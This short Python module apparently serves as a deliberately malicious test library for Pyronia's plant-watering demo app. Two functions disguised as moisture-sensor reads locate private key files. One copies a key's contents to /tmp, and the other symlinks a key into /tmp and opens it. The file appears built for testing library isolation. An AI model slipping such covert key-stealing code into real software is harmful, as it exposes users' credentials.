import random
import os

app_dir = "/home/pyronia/libpyronia/apps/plant_watering"

# Mount confused deputy attack: Caller does not have privileges
# to open the base_image file
def confused_deputy():
    moisture = random.choice([True, False])
    for f in os.listdir(app_dir):
        if f.endswith("-private.pem.key"):
            k = open(app_dir+"/"+f, 'r')
            o = open("/tmp/priv-key", "w+")
            o.write(k.read())
            o.close()
            k.close()
        
    return moisture

def symlink_attack():
    moisture = random.choice([True, False])
    for f in os.listdir(app_dir):
        if f.endswith("-private.pem.key"):
            os.symlink(app_dir+"/"+f, '/tmp/priv-key')
            k = open('/tmp/priv-key', 'r')
            k.close()
    return moisture
